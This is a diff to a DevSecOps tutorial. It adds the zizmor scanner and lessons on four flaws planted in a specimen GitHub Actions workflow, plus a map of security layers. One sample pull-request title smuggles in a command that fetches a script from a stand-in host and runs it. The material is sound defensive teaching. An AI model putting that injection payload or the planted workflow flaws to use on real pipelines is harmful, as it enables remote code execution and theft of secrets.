@@ -17,7 +17,7 @@ explains how that report came to exist.
 
 ## The story in one paragraph
 
-`sample-app/` is a tiny web app with security mistakes planted on purpose. Three
+`sample-app/` is a tiny web app with security mistakes planted on purpose. Four
 **scanners** (programs that inspect code for problems) each look for a different kind
 of mistake. They all report in different formats, so the **bridge** translates every
 report into one common shape, removes duplicates, asks a **policy** whether the result
@@ -25,7 +25,7 @@ is acceptable, and then writes reports and answers "pass" or "blocked".
 
 ---
 
-## Lesson 0: what is a scanner, and why three?
+## Lesson 0: what is a scanner, and why four?
 
 A scanner is a program that reads your project and flags known mistakes, a bit like a
 spell-checker for security. No single scanner covers everything, so teams run several:
@@ -35,6 +35,7 @@ spell-checker for security. No single scanner covers everything, so teams run se
 | **Gitleaks** | Secrets (passwords, API tokens) left in code | a fake token in `config.py` |
 | **Semgrep** | Risky code patterns (called SAST) | SQL injection in `app.py` line 20 |
 | **Trivy** | Known-vulnerable libraries and bad infrastructure settings | old libraries in `requirements.txt`, root user in `Dockerfile` |
+| **zizmor** | Unsafe CI/CD pipeline files (GitHub Actions workflows) | `sample-app/.github/workflows/build.yml` (see Lesson 17) |
 
 Why each matters:
 
@@ -175,7 +176,7 @@ link can break in its own way:
 | --- | --- | --- |
 | Source code | what developers write, and secrets left in it | SQL injection, fake token |
 | Dependencies | third-party libraries | old Flask, PyYAML, Jinja2, requests |
-| CI/CD pipeline | the automatic build-and-ship line | none yet (no scanner for it) |
+| CI/CD pipeline | the automatic build-and-ship line | four planted flaws in `build.yml` (Lesson 17) |
 | Container image | the packaged app (Docker) | runs as root |
 | Infrastructure as code | servers and cloud described in files (Terraform) | SSH open to the internet (`infra/main.tf`) |
 | Kubernetes | the system that runs many containers | privileged container (`k8s/deployment.yaml`) |
@@ -202,14 +203,17 @@ re-run. The Dependencies row should change.
 
 ## Lesson 13: "clean" needs proof (`bridge/layers.py`)
 
-A layer with zero findings is only **clean** if some scanner really looked at it. Two
-layers in our stack (CI/CD pipeline, Running system) have no scanner yet, so the report
-says **not scanned**, never "clean". Also, if Trivy is not installed, the container
-layer drops from "clean" to "not scanned" automatically. A green tick for something
-nobody inspected is how real breaches hide, so the bridge refuses to hand one out.
+A layer with zero findings is only **clean** if some scanner really looked at it. One
+layer in our stack (Running system) has no scanner yet, so the report says **not
+scanned**, never "clean". The same rule applies to a scanner that is missing: if Trivy is
+not installed, the container layer drops from "clean" to "not scanned" automatically, and
+if a project has no `.github/workflows` folder, zizmor has nothing to check and the
+pipeline layer shows "not scanned" too. A green tick for something nobody inspected is
+how real breaches hide, so the bridge refuses to hand one out.
 
-This also gives you a built-in roadmap: each "not scanned" row is a feature to build
-(a pipeline scanner for layer 3, runtime testing for layer 7).
+This also gives you a built-in roadmap: each "not scanned" row is a feature to build.
+(The pipeline layer used to be one; Lesson 17 closed it. Runtime testing for layer 7 is
+still open.)
 
 **Limits to know about:** our scanners can only see what is in the files you point them
 at. The Kubernetes layer here means manifest files in the repo, not a live cluster, and
@@ -356,13 +360,147 @@ too, and a canary for each is a sensible later addition.
 
 ---
 
+## Lesson 17: the pipeline is a target too (`zizmor`, layer 3)
+
+**Why attackers love pipelines.** Your pipeline holds the keys: it can read your code,
+use your secrets, and publish what your customers install. Break into a pipeline and you
+do not need to break into the app. Two real examples:
+
+- **SolarWinds (2020):** attackers got into the *build system* and slipped malicious code
+  into an official software update, which was then delivered to thousands of customers.
+- **tj-actions/changed-files (March 2025):** a popular GitHub Action was tampered with so
+  that, as publicly reported, thousands of repositories that used it leaked their secrets
+  into their build logs. Repositories that referred to a fixed, full commit were not hit.
+
+So the pipeline file deserves the same scrutiny as application code. **zizmor** is a
+scanner built for GitHub Actions workflow files. `sample-app/.github/workflows/build.yml`
+contains four planted mistakes (it is a *specimen*: it sits inside `sample-app/`, so
+GitHub never runs it, and the real pipeline at the repo root stays safe).
+
+**Quick vocabulary first.** A **trigger** (`on:`) says what starts the workflow. A
+**runner** is the temporary machine that runs it. **`GITHUB_TOKEN`** is a password GitHub
+creates for each run so the workflow can talk to your repository; its power is set by
+`permissions:`. **Secrets** are stored passwords the workflow can use.
+
+**The four planted flaws**
+
+1. **`on: pull_request_target` (rule `dangerous-triggers`).** A normal pull-request trigger
+   runs with *no secrets*, because the code comes from outsiders. This special trigger runs
+   in the context of *your* repository, with your secrets and write access, even when the
+   pull request comes from a stranger's fork. It is safe only if the workflow never runs
+   the stranger's code, and the specimen does exactly that (it checks out the pull
+   request's code). Safer: use `pull_request`.
+2. **`permissions: write-all` (rule `excessive-permissions`).** This hands the run's token
+   every permission. If anything in the job is hijacked, the attacker inherits all of it.
+   This is *least privilege* again (Lesson 14): start from `contents: read` and add only
+   what a job truly needs.
+3. **`uses: actions/checkout@main` (rule `unpinned-uses`).** `@main` means "whatever the
+   latest code on the main branch is today". If that code changes, or is tampered with, your
+   pipeline runs the new version without you ever approving it. The tj-actions incident
+   worked like this. Safer: pin to a full commit hash (40 characters) and note the version
+   in a comment, because a hash cannot be quietly moved. The same line also triggers
+   `artipacked`: checkout leaves your token on disk, which can leak if the folder is later
+   uploaded as an artifact. Fix: `persist-credentials: false`.
+4. **`run: echo "... ${{ github.event.pull_request.title }}"` (rule `template-injection`).**
+   GitHub swaps `${{ ... }}` for its value *before* the shell runs. So if a pull request
+   is titled `"; curl evil.example | sh; echo "`, the shell runs that as a command. This is
+   *injection*, the same family as the SQL injection in `app.py` (Lesson 0): untrusted text
+   becomes code. Fix: pass the value through an environment variable
+   (`env: TITLE: ${{ ... }}`) and use `"$TITLE"` in the script, so it stays plain text.
+
+**How the bridge handles it.** `parse_zizmor` in `bridge/adapters.py` turns zizmor's list
+into the same `Finding` shape as everything else, so these now appear in the layer table as
+**CI/CD pipeline** with the same blocking policy. Notice how little code that took: this is
+Lesson 2 paying off. Details worth knowing:
+
+- zizmor counts lines from 0, and the adapter adds 1 (a test pins this).
+- zizmor uses its own exit codes: 0 is clean, 11 to 14 mean "found something" (by severity),
+  and 1 means it failed. The bridge passes `--no-exit-codes` and also accepts 11 to 14, so
+  "found something" is never mistaken for "broke".
+- `--offline` makes zizmor skip checks that need internet and a GitHub token (for example
+  checking whether an action version has a published vulnerability). That gives identical
+  results everywhere but misses those checks, a trade-off you can revisit.
+- If the scanned folder has no `.github/workflows`, zizmor is **skipped**, not "clean"
+  (Lesson 13).
+
+**Try it:** fix `build.yml` one flaw at a time (change `write-all` to `contents: read`,
+pin the checkout to a version tag such as `@v4`), re-run the real scan, and watch the
+pipeline row shrink. Also set `SCAN_PATH: "."` in the workflow: the bridge will then scan
+**its own pipeline file**, which is a satisfying (and humbling) test.
+
+**Honest limits:** the zizmor sample output in `fixtures/` is hand-written from its
+documentation, so the real tool may word things differently. zizmor only understands
+GitHub Actions; GitLab CI, Jenkins and others need other tools. And a scanner reads the
+file, not the repository settings, so things like "can anyone approve their own pull
+request?" are invisible to it.
+
+---
+
+## Lesson 18: the map, DevOps and what DevSecOps adds at each layer
+
+Everything so far in one table. Read it left to right: the DevOps practice, how it goes
+wrong, what DevSecOps adds, and which tool in this project does that job.
+
+| Layer | DevOps practice | How it goes wrong | DevSecOps addition | In this project |
+| --- | --- | --- | --- | --- |
+| 1. Source code | Developers commit to Git, others review | Secrets committed, injection bugs | Secret scanning, SAST, review rules | Gitleaks, Semgrep |
+| 2. Dependencies | Reuse open-source libraries | A library you never wrote has a known flaw | Software composition analysis, SBOM, auto-update bots | Trivy (Renovate later) |
+| 3. CI/CD pipeline | Automatic build, test, deploy | Pipeline hijacked, over-trusted, secrets leaked | Least-privilege tokens, pinned actions, pipeline scanning | zizmor, the workflow itself |
+| 4. Container image | Package the app so it runs anywhere | Runs as root, bloated, old base image | Image scanning, non-root users, signed images | Trivy (Cosign later) |
+| 5. Infrastructure as code | Servers and cloud defined in files | Open ports, public storage | Policy checks before anything is created | Trivy (OPA later) |
+| 6. Kubernetes | Orchestrate many containers | Privileged pods, no limits, default settings | Admission policies, pod security rules | Trivy (Kyverno later) |
+| 7. Running system | Monitor and operate production | Attacks and drift nobody sees | Runtime detection, live testing, alerting | not yet |
+
+Three ideas run through every row:
+
+- **Shift left.** Find problems as early in the chain as you can, because fixing a leaked
+  secret in layer 1 costs minutes while fixing it after a breach costs weeks. The layer
+  order in the report *is* the left-to-right order.
+- **Automate the check, not just the build.** DevOps automated building and shipping.
+  DevSecOps adds automated *judgement* at each step: a pass/block decision no one has to
+  remember to make. That is the job of the policy and the exit code.
+- **Everything as code.** Pipeline, infrastructure and now the rules (`policy.json`) are
+  files in Git, so they are reviewed, versioned and testable. This is the idea behind
+  "policy as code", coming in phase 2b with OPA.
+
+### Check yourself (answers below)
+
+1. A scanner finds a secret in `config.py` and another finds an open SSH port in
+   `main.tf`. Which layers are those, and why might different people fix them?
+2. Why does the report say "not scanned" instead of "clean" for the running system?
+3. `permissions: write-all` is dangerous even when nothing is wrong today. Why?
+4. Why can pinning an action to a full commit protect you from the tj-actions kind of attack,
+   while `@v4` or `@main` cannot?
+5. What would happen if the bridge treated zizmor's exit code 13 as "the tool crashed"?
+6. Why was merging "same file and same line" findings a bug (Lesson 15)?
+
+<details>
+<summary>Answers</summary>
+
+1. Source code (layer 1) and Infrastructure as code (layer 5). A developer fixes the
+   secret; whoever manages the cloud fixes the port. The layer tells you who to ask.
+2. Because no tool inspects it. A "clean" would mean "checked and fine", which would be
+   false. Silence is not safety.
+3. Least privilege: permissions are about what an attacker could do *if* something else
+   goes wrong. Broad rights turn a small break-in into a total one.
+4. A tag or branch can be moved to different code after you trusted it; a full commit hash
+   identifies exactly one version of the code and cannot be quietly changed.
+5. Every run that found anything would be reported as a tool failure, so real findings
+   would be hidden behind "failed" and people would stop trusting the report.
+6. Two different problems on the same line were treated as one, so a real finding (a
+   privileged container) disappeared from the report. Wrongly merging hides risk.
+
+</details>
+
+---
+
 ## Running the real scanners
 
 Demo mode reads saved sample outputs from `fixtures/`. Those samples were written by hand
 in each tool's output layout, so the real tools may report more, fewer or differently
 worded results.
 
-To use the real thing, install the three tools (see README), then:
+To use the real thing, install the four tools (see README), then:
 
 ```
 python3 -m bridge scan sample-app
